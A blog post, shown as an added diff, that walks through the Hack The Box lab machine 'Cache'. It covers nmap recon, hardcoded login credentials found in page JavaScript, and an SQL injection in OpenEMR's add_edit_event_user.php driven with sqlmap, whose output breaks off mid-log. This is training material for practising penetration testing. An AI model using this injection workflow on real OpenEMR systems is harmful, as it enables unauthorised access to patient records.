@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Daniel Cano">
+<meta name="description" content="Writeup about the Hackthebox retired machine Cache 10.10.10.188">
+<meta name="keywords" content="hacking, technology, programming">
+<meta name="referrer" content="always">
+<meta property="og:description" content="Writeup about the Hackthebox retired machine Cache 10.10.10.188">
+<meta property="og:title" content="Writeup Hackthebox HTB Cache">
+<meta property="og:url" content="https://u915.net/posts/2020/10/writeup-hackthebox-htb-cache/">
+<meta property="og:image" content="https://u915.net/images/logo_small.png" />
+<title>Writeup Hackthebox HTB Cache - u915</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+<link rel="icon" href="/images/favicon.png" type="image/x-icon">
+<link rel="shortcut icon" href="/images/favicon_48_48.png">
+</head>
+<body>
+<header>
+  <div class="blog-header">
+    <h1><a href="https://u915.net/">u915</a></h1>
+    <div><a href="https://u915.net/"><img src="/images/logo_small.png" class="bloglogo"></img></a></div><h4>Daniel Cano Merchán - Hacking &amp; Tech</h4>
+  </div>
+  <nav><a href="/">Index</a><a href="/posts/">Posts</a><a href="/tags/">Tags</a><a href="/hacking-tools/">Tools</a><a href="/about/">About</a></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>Writeup Hackthebox HTB Cache</h1>
+  </div>
+<div class="meta">
+  <div class="meta-bar">2020-10-10
+  <span><a href="https://u915.net/tags/hacking/">#Hacking</a></span>
+      <span><a href="https://u915.net/tags/hackthebox/">#Hackthebox</a></span>
+      <span><a href="https://u915.net/tags/pentesting/">#Pentesting</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h2 id="0---basic-info">0 - Basic info</h2>
+<p>OS: Linux</p>
+<p>IP: 10.10.10.185</p>
+<h2 id="1---reconnaissance-and-enumeration">1 - Reconnaissance and enumeration</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS -sV -sC -O 10.10.10.188
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-02 23:02 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.188
+Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Cache
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
+TCP/IP fingerprint:
+OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.80%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>8/2%OT<span style="color:#f92672">=</span>22%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>40769%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>I%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span>5F2729EE
+OS:%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>106%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>109%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>
+OS:O1<span style="color:#f92672">=</span>M54DST11NW7%O2<span style="color:#f92672">=</span>M54DST11NW7%O3<span style="color:#f92672">=</span>M54DNNT11NW7%O4<span style="color:#f92672">=</span>M54DST11NW7%O5<span style="color:#f92672">=</span>M54DST11
+OS:NW7%O6<span style="color:#f92672">=</span>M54DST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FE88%W2<span style="color:#f92672">=</span>FE88%W3<span style="color:#f92672">=</span>FE88%W4<span style="color:#f92672">=</span>FE88%W5<span style="color:#f92672">=</span>FE88%W6<span style="color:#f92672">=</span>FE88<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>
+OS:R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>FAF0%O<span style="color:#f92672">=</span>M54DNNSNW7%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS
+OS:%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>
+OS:Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>
+OS:R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T
+OS:<span style="color:#f92672">=</span>40%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%CD<span style="color:#f92672">=</span>
+OS:S<span style="color:#f92672">)</span>
+
+Network Distance: <span style="color:#ae81ff">2</span> hops                                                                                                                                                                                                                   
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                                                    
+                                                                                                                                                                                                                                           
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                      
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.38 seconds 
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -Pn -n -sV --script vuln 10.10.10.188
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-02 23:06 CEST                                                                                                                                                                           
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.188                                                                                                                                                                                                          
+Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.                                                                                                                                                                                                               
+Not shown: <span style="color:#ae81ff">997</span> closed ports                                                                                                                                                                                                                
+PORT     STATE    SERVICE   VERSION                                                                                                                                                                                                        
+22/tcp   open     ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>                                                                                                                                                   
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>                                                                                                                                                                            
+80/tcp   open     http      Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>                                                                                                                                                                                 
+|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>                                                                                                                                                                            
+| http-csrf: 
+| Spidering limited to: maxdepth<span style="color:#f92672">=</span>3; maxpagecount<span style="color:#f92672">=</span>20; withinhost<span style="color:#f92672">=</span>10.10.10.188
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://10.10.10.188:80/contactus.html
+|     Form id: fname
+|     Form action: contactus.html#
+|     
+|     Path: http://10.10.10.188:80/login.html
+|     Form id: loginform
+|_    Form action: net.html
+|_http-dombased-xss: Couldn<span style="color:#e6db74">&#39;t find any DOM based XSS.
+</span><span style="color:#e6db74">| http-enum: 
+</span><span style="color:#e6db74">|_  /login.html: Possible admin folder
+</span><span style="color:#e6db74">|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span><span style="color:#e6db74">|_http-stored-xss: Couldn&#39;</span>t find any stored XSS vulnerabilities.
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.29: 
+|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
+|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
+|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
+|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
+|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
+|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
+|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
+|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
+|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
+|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
+|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
+|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
+|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
+|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
+2107/tcp filtered msmq-mgmt
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 45.87 seconds
+</code></pre></div><p>Nothing interesting at first place.</p>
+<p>Checking inside the port 80, there is a form login:</p>
+<p><img src="/images/posts/htb_cache_1.png" alt="alt text" title="HTB Cache login"></p>
+<p>Tried to bruteforce using usual password without luck.</p>
+<p>So, I manually checked the sources inside the web:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">view</span><span style="color:#f92672">-</span><span style="color:#a6e22e">source</span><span style="color:#f92672">:</span><span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//10.10.10.188/jquery/functionality.js
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">$</span>(<span style="color:#66d9ef">function</span>(){
+    
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">error_correctPassword</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">error_username</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+    
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkCorrectPassword</span>(){
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">Password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#password&#34;</span>).<span style="color:#a6e22e">val</span>();
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">Password</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;H@v3_fun&#39;</span>){
+            <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Password didn&#39;t Match&#34;</span>);
+            <span style="color:#a6e22e">error_correctPassword</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+        }
+    }
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkCorrectUsername</span>(){
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">Username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#username&#34;</span>).<span style="color:#a6e22e">val</span>();
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">Username</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;ash&#34;</span>){
+            <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Username didn&#39;t Match&#34;</span>);
+            <span style="color:#a6e22e">error_username</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+        }
+    }
+    <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#loginform&#34;</span>).<span style="color:#a6e22e">submit</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">event</span>) {
+        <span style="color:#75715e">/* Act on the event */</span>
+        <span style="color:#a6e22e">error_correctPassword</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+         <span style="color:#a6e22e">checkCorrectPassword</span>();
+         <span style="color:#a6e22e">error_username</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+         <span style="color:#a6e22e">checkCorrectUsername</span>();
+
+
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">error_correctPassword</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">error_username</span> <span style="color:#f92672">==</span><span style="color:#66d9ef">false</span>){
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+        }
+        <span style="color:#66d9ef">else</span>{
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+        }
+    });
+    
+});
+</code></pre></div><p>So the password is <em>H@v3_fun</em>, but does not nothing using it, saved for later.</p>
+<p>Also i got another username on the sources:</p>
+<p><img src="/images/posts/htb_cache_2.png" alt="alt text" title="HTB Cache John"></p>
+<p>John, because:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logo1.png&#34;</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;John&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width:100%&#34;</span>&gt;
+</code></pre></div><p>Also there is enabled Apache directory list, leaking the OS and Apache version:</p>
+<p><img src="/images/posts/htb_cache_3.png" alt="alt text" title="HTB Cache directory listing enabled"></p>
+<p>I was stuck for a while, then I come back to the login page after the sucess i saw:</p>
+<p><img src="/images/posts/htb_cache_4.png" alt="alt text" title="HTB Cache HMS"></p>
+<p>HMS&hellip;Hospital Management System. It caugth my attention because is totally different from the hacker stuff that the blog has.</p>
+<p>Checking on Google, says that is a type of CMS or Software for medic/doctors administration.</p>
+<p>I tried to search references inside the host and finally I discovered that it has another hostname, so editing my /etc/hosts:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">10.10.10.188 cache.htb hms.htb
+</code></pre></div><p>Now i can view the openmr login page</p>
+<p><img src="/images/posts/htb_cache_5.png" alt="alt text" title="HTB Cache Login Page EMR"></p>
+<h2 id="2---vulnerability-identification">2 - Vulnerability Identification</h2>
+<p>I tried to bruteforce the login page without any luck and started a Dirbuster with a really huge results:</p>
+<p><img src="/images/posts/htb_cache_6.png" alt="alt text" title="HTB Cache Dirbuster against EMR"></p>
+<h3 id="googling-again">Googling again</h3>
+<p>Checking on exploit-db, there is a Exploit to bypass the login:</p>
+<p><a href="https://www.exploit-db.com/exploits/47836">https://www.exploit-db.com/exploits/47836</a></p>
+<p>But did not work maybe because the version.</p>
+<p>So finally i discovered this video:</p>
+<p><a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s">https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s</a></p>
+<p>The video says there is a SQLInjection on:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">add_edit_event_user.php
+</code></pre></div><p>I forced the error with -1:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">add_edit_event_user.php?eid<span style="color:#f92672">=</span>-1
+</code></pre></div><p><img src="/images/posts/htb_cache_7.png" alt="alt text" title="HTB Cache SQLi"></p>
+<h2 id="3---exploit">3 - Exploit</h2>
+<p>I saved the request with <em>Burp Suite</em> and saved to a file <em>request.txt</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GET /portal/add_edit_event_user.php?eid<span style="color:#f92672">=</span>-1 HTTP/1.1
+Host: hms.htb
+User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:68.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,*/*;q<span style="color:#f92672">=</span>0.8
+Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: OpenEMR<span style="color:#f92672">=</span>meu64c25re4gemh5babmve2r50; PHPSESSID<span style="color:#f92672">=</span>j3bt6qtabctf5euorhg3lme69f
+Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</code></pre></div><h3 id="sqlmap">SQLmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+qlmap -r request.txt 
+        ___
+       __H__                                                                                                                                                                                                                               
+ ___ ___<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.4.7#stable<span style="color:#f92672">}</span>                                                                                                                                                                                                   
+|_ -| . <span style="color:#f92672">[</span>.<span style="color:#f92672">]</span>     | .<span style="color:#e6db74">&#39;| . |                                                                                                                                                                                                                  
+</span><span style="color:#e6db74">|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                  
+</span><span style="color:#e6db74">      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span style="color:#66d9ef">for</span> any misuse or damage caused by this program
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> starting @ 20:38:14 /2020-08-03/
+
+<span style="color:#f92672">[</span>20:38:14<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> parsing HTTP request from <span style="color:#e6db74">&#39;request.txt&#39;</span>
+<span style="color:#f92672">[</span>20:38:14<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> it appears that you have provided tainted parameter values <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;eid=-1&#39;</span><span style="color:#f92672">)</span> with most likely leftover chars/statements from manual SQL injection test<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>. Please, always use only valid parameter values so sqlmap could be able to run properly
+are you really sure that you want to <span style="color:#66d9ef">continue</span> <span style="color:#f92672">(</span>sqlmap could have problems<span style="color:#f92672">)</span>? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span> y
+<span style="color:#f92672">[</span>20:38:29<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing connection to the target URL
+<span style="color:#f92672">[</span>20:38:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
+<span style="color:#f92672">[</span>20:38:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> checking <span style="color:#66d9ef">if</span> the target is protected by some kind of WAF/IPS
+<span style="color:#f92672">[</span>20:38:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#66d9ef">if</span> the target URL content is stable
+<span style="color:#f92672">[</span>20:38:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> target URL content is stable
+<span style="color:#f92672">[</span>20:38:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#66d9ef">if</span> GET parameter <span style="color:#e6db74">&#39;eid&#39;</span> is dynamic
+<span style="color:#f92672">[</span>20:38:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> GET parameter <span style="color:#e6db74">&#39;eid&#39;</span> does not appear to be dynamic
+<span style="color:#f92672">[</span>20:38:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> heuristic <span style="color:#f92672">(</span>basic<span style="color:#f92672">)</span> test shows that GET parameter <span style="color:#e6db74">&#39;eid&#39;</span> might be injectable <span style="color:#f92672">(</span>possible DBMS: <span style="color:#e6db74">&#39;MySQL&#39;</span><span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>20:38:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#66d9ef">for</span> SQL injection on GET parameter <span style="color:#e6db74">&#39;eid&#39;</span>
+it looks like the back-end DBMS is <span style="color:#e6db74">&#39;MySQL&#39;</span>. Do you want to skip test payloads specific <span style="color:#66d9ef">for</span> other DBMSes? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
+<span style="color:#66d9ef">for</span> the remaining tests, <span style="color:#66d9ef">do</span> you want to include all tests <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;MySQL&#39;</span> extending provided level <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> and risk <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> values? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
+<span style="color:#f92672">[</span>20:38:40<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
+<span style="color:#f92672">[</span>20:38:40<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> reflective value<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> found and filtering out
+<span style="color:#f92672">[</span>20:38:41<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Boolean-based blind - Parameter replace (original value)&#39;</span>
+<span style="color:#f92672">[</span>20:38:41<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> GET parameter <span style="color:#e6db74">&#39;eid&#39;</span> appears to be <span style="color:#e6db74">&#39;Boolean-based blind - Parameter replace (original value)&#39;</span> injectable <span style="color:#f92672">(</span>with --not-string<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;row&#34;</span><span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>20:38:41<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Generic inline queries&#39;</span>
+<span style="color:#f92672">[</span>20:38:41<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#39;</span>
+<span style="color:#f92672">[</span>20:38:41<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#39;</span>
+<span style="color:#f92672">[</span>20:38:41<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#39;</span>
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#39;</span>
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#39;</span>
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#39;</span>
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;</span>
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;</span>
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;</span>
